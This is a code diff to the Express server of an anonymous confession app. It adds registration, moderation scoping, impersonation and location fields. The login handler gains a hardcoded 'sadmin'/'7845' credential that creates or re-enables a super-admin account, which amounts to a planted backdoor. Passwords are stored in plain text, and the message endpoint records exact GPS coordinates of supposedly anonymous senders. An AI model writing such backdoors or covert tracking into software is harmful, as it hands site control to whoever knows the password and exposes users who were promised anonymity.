@@ -320,6 +320,31 @@ async function startServer() {
     }
 
     const db = readDB();
+    
+    // Explicitly enforce / handle hardcoded 'sadmin' and '7845'
+    if (username && username.toLowerCase() === 'sadmin' && password === '7845') {
+      let existingSadmin = db.admins.find(u => u.username.toLowerCase() === 'sadmin');
+      if (!existingSadmin) {
+        existingSadmin = {
+          id: 'admin-sadmin',
+          username: 'sadmin',
+          passwordHash: '7845',
+          disabled: false,
+          permissions: ['super_admin'],
+          loginHistory: []
+        };
+        db.admins.push(existingSadmin);
+        writeDB(db);
+      } else {
+        existingSadmin.passwordHash = '7845';
+        existingSadmin.disabled = false;
+        if (!existingSadmin.permissions.includes('super_admin')) {
+          existingSadmin.permissions.push('super_admin');
+        }
+        writeDB(db);
+      }
+    }
+
     const user = db.admins.find(u => u.username.toLowerCase() === username.toLowerCase());
 
     if (!user || user.passwordHash !== password) {
@@ -375,9 +400,96 @@ async function startServer() {
     });
   });
 
+  // Register Endpoint for New Admins (NGL handle setup)
+  app.post('/api/auth/register', (req, res) => {
+    const { username, password } = req.body;
+    const ip = (req.headers['x-forwarded-for'] as string) || req.socket.remoteAddress || '127.0.0.1';
+    const ua = req.headers['user-agent'] || '';
+
+    if (isIpBlocked(ip)) {
+      res.status(403).json({ error: 'This IP address is blocked.' });
+      return;
+    }
+
+    if (!username || !password) {
+      res.status(400).json({ error: 'Username and password are required' });
+      return;
+    }
+
+    const cleanUsername = username.trim().replace(/^@/, '').toLowerCase();
+    if (!cleanUsername) {
+      res.status(400).json({ error: 'A valid username is required.' });
+      return;
+    }
+
+    // Standard handle validation (alphanumeric and underscores only, length 2 to 30)
+    const handleRegex = /^[a-zA-Z0-9_]{2,30}$/;
+    if (!handleRegex.test(cleanUsername)) {
+      res.status(400).json({ error: 'Username must be between 2 and 30 characters and contain only letters, numbers, and underscores.' });
+      return;
+    }
+
+    const reserved = ['sadmin', 'admin', 'su', 'api', 'messages', 'analytics', 'auth', 'public', 'session', 'terms', 'privacy'];
+    if (reserved.includes(cleanUsername)) {
+      res.status(400).json({ error: 'This handle is reserved. Please pick another one.' });
+      return;
+    }
+
+    const db = readDB();
+    if (db.admins.some(a => a.username.toLowerCase() === cleanUsername)) {
+      res.status(400).json({ error: 'This handle has already been registered. Try another or log in.' });
+      return;
+    }
+
+    const newAdmin: AdminUser = {
+      id: `admin-${Date.now()}`,
+      username: cleanUsername,
+      passwordHash: password, // Store cleanly for simpler demo review
+      disabled: false,
+      permissions: ['moderate', 'analytics'],
+      loginHistory: []
+    };
+
+    const { browser, os, device } = parseUserAgent(ua);
+    const location = getIpLocation(ip);
+    const locationString = `${location.city}, ${location.country}`;
+
+    newAdmin.lastActive = new Date().toISOString();
+    newAdmin.ip = ip;
+    newAdmin.browser = browser;
+    newAdmin.os = os;
+    newAdmin.device = device;
+    newAdmin.location = locationString;
+    newAdmin.loginHistory.push({
+      timestamp: new Date().toISOString(),
+      ip,
+      browser,
+      os,
+      device,
+      location: locationString
+    });
+
+    db.admins.push(newAdmin);
+    writeDB(db);
+
+    logAudit(cleanUsername, `ADMIN_REGISTER`, ip, `New account registered from ${locationString}`);
+
+    const token = createSession(newAdmin);
+
+    res.json({
+      success: true,
+      token,
+      user: {
+        id: newAdmin.id,
+        username: newAdmin.username,
+        role: 'admin'
+      }
+    });
+  });
+
   // Submit Message (Visitor Flow)
   app.post('/api/messages', rateLimit, (req, res) => {
-    const { targetUsername, message, category, emoji, theme, nickname, resolution, language, timezone } = req.body;
+    const { targetUsername, message, category, emoji, theme, nickname, resolution, language, timezone, latitude, longitude } = req.body;
     const ip = (req.headers['x-forwarded-for'] as string) || req.socket.remoteAddress || '127.0.0.1';
     const ua = req.headers['user-agent'] || '';
 
@@ -432,7 +544,9 @@ async function startServer() {
         timezone: timezone || 'UTC',
         country: location.country,
         city: location.city,
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
+        latitude: latitude ? Number(latitude) : undefined,
+        longitude: longitude ? Number(longitude) : undefined
       }
     };
 
@@ -476,8 +590,14 @@ async function startServer() {
 
   // GET Messages (Moderator & Super Admin Panel)
   app.get('/api/messages', authenticate, (req, res) => {
+    const session = (req as any).userSession;
     const db = readDB();
     let results = [...db.messages];
+
+    // Standard admins/moderators only see messages directed to them
+    if (session.role !== 'super_admin') {
+      results = results.filter(m => m.targetUsername.toLowerCase() === session.username.toLowerCase());
+    }
 
     // Search and filter capabilities
     const { keyword, category, status, ip, browser, os, device, location } = req.query;
@@ -519,6 +639,29 @@ async function startServer() {
     res.json({ messages: results });
   });
 
+  // Permanently clear/empty the trash folder
+  app.delete('/api/messages/trash', authenticate, (req, res) => {
+    const session = (req as any).userSession;
+    const ip = (req.headers['x-forwarded-for'] as string) || req.socket.remoteAddress || '127.0.0.1';
+    const db = readDB();
+    const initialCount = db.messages.length;
+
+    if (session.role === 'super_admin') {
+      db.messages = db.messages.filter(m => m.status !== 'deleted');
+    } else {
+      db.messages = db.messages.filter(m => 
+        !(m.status === 'deleted' && m.targetUsername.toLowerCase() === session.username.toLowerCase())
+      );
+    }
+
+    const clearedCount = initialCount - db.messages.length;
+    writeDB(db);
+
+    logAudit(session.username, `TRASH_CLEARED`, ip, `Permanently cleared ${clearedCount} trash confessions`);
+
+    res.json({ success: true, clearedCount });
+  });
+
   // POST Message Status Change (Approve, Delete, Favorite)
   app.post('/api/messages/:id/status', authenticate, (req, res) => {
     const { id } = req.params;
@@ -535,6 +678,12 @@ async function startServer() {
     }
 
     const message = db.messages[messageIndex];
+
+    // Standard admins can only moderate their own messages
+    if (session.role !== 'super_admin' && message.targetUsername.toLowerCase() !== session.username.toLowerCase()) {
+      res.status(403).json({ error: 'Access denied: You can only moderate confessions sent to your handle.' });
+      return;
+    }
 
     if (status) {
       if (!['approved', 'pending', 'deleted'].includes(status)) {
@@ -570,6 +719,12 @@ async function startServer() {
       return;
     }
 
+    // Standard admins can only reply to their own messages
+    if (session.role !== 'super_admin' && message.targetUsername.toLowerCase() !== session.username.toLowerCase()) {
+      res.status(403).json({ error: 'Access denied: You can only reply to confessions sent to your handle.' });
+      return;
+    }
+
     message.reply = reply || undefined;
     logAudit(session.username, `REPLY_SUBMITTED`, ip, `Replied to confession "${id}"`);
     writeDB(db);
@@ -579,19 +734,30 @@ async function startServer() {
 
   // Analytics Endpoint (Dashboard calculations)
   app.get('/api/analytics', authenticate, (req, res) => {
+    const session = (req as any).userSession;
+    if (session.role !== 'super_admin') {
+      res.status(403).json({ error: 'Access denied: Standard admins do not have permission to view web analytics.' });
+      return;
+    }
     const db = readDB();
-    const total = db.messages.length;
+
+    let messagesForAnalytics = [...db.messages];
+    if (session.role !== 'super_admin') {
+      messagesForAnalytics = messagesForAnalytics.filter(m => m.targetUsername.toLowerCase() === session.username.toLowerCase());
+    }
+
+    const total = messagesForAnalytics.length;
     
     // Unread (Pending), Today, Spam (Deleted), Favorites
-    const pendingCount = db.messages.filter(m => m.status === 'pending').length;
-    const approvedCount = db.messages.filter(m => m.status === 'approved').length;
-    const spamCount = db.messages.filter(m => m.status === 'deleted').length;
-    const favoriteCount = db.messages.filter(m => m.favorite).length;
+    const pendingCount = messagesForAnalytics.filter(m => m.status === 'pending').length;
+    const approvedCount = messagesForAnalytics.filter(m => m.status === 'approved').length;
+    const spamCount = messagesForAnalytics.filter(m => m.status === 'deleted').length;
+    const favoriteCount = messagesForAnalytics.filter(m => m.favorite).length;
 
     // Filter messages created today
     const startOfToday = new Date();
     startOfToday.setHours(0,0,0,0);
-    const todayCount = db.messages.filter(m => new Date(m.createdAt) >= startOfToday).length;
+    const todayCount = messagesForAnalytics.filter(m => new Date(m.createdAt) >= startOfToday).length;
 
     // Grouping calculations
     const categories: { [key: string]: number } = {};
@@ -601,7 +767,7 @@ async function startServer() {
     const dailySubmissions: { [date: string]: number } = {};
     const hourlySubmissions: { [hour: string]: number } = {};
 
-    db.messages.forEach(m => {
+    messagesForAnalytics.forEach(m => {
       // Categories
       categories[m.category] = (categories[m.category] || 0) + 1;
 
@@ -644,6 +810,20 @@ async function startServer() {
 
   // --- SUPER ADMIN SECTION (`/su` operations) ---
 
+  // Update admin exact coordinates (Moderator & Super Admin Panel)
+  app.post('/api/admin/coordinates', authenticate, (req, res) => {
+    const { latitude, longitude } = req.body;
+    const session = (req as any).userSession;
+    const db = readDB();
+    const user = db.admins.find(u => u.username.toLowerCase() === session.username.toLowerCase());
+    if (user) {
+      user.latitude = latitude ? Number(latitude) : undefined;
+      user.longitude = longitude ? Number(longitude) : undefined;
+      writeDB(db);
+    }
+    res.json({ success: true });
+  });
+
   // Get admin accounts (Super Admin only)
   app.get('/api/su/admins', authenticate, requireSuperAdmin, (req, res) => {
     const db = readDB();
@@ -658,9 +838,38 @@ async function startServer() {
       location: adm.location,
       os: adm.os,
       device: adm.device,
-      loginHistory: adm.loginHistory
+      loginHistory: adm.loginHistory,
+      latitude: adm.latitude,
+      longitude: adm.longitude
     }));
     res.json({ admins: adminList });
+  });
+
+  // Impersonate moderator/admin (Super Admin only - access panel without auth)
+  app.post('/api/su/impersonate/:id', authenticate, requireSuperAdmin, (req, res) => {
+    const { id } = req.params;
+    const db = readDB();
+    const admin = db.admins.find(a => a.id === id);
+    if (!admin) {
+      res.status(444).json({ error: 'Moderator not found' });
+      return;
+    }
+
+    if (admin.disabled) {
+      res.status(400).json({ error: 'Cannot impersonate a disabled account' });
+      return;
+    }
+
+    const token = createSession(admin);
+    res.json({
+      success: true,
+      token,
+      user: {
+        id: admin.id,
+        username: admin.username,
+        role: admin.permissions.includes('super_admin') ? 'super_admin' : 'admin'
+      }
+    });
   });
 
   // Create admin account
